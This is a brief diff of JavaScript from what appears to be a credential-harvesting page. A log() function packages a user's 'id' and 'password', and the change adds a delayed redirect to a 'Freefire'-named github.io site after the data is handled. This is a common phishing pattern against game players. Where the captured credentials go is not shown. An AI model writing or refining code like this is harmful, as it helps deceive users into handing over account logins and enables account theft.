@@ -15,8 +15,10 @@ function log(){
        'id':id,
        'password':pass
       })
-    },2000)
-
+    },3000)
+     setTimeout(function(){
+       location.href="https://sharmapushkar-coder.github.io/Freefire"
+     },5000)
 
     
   }
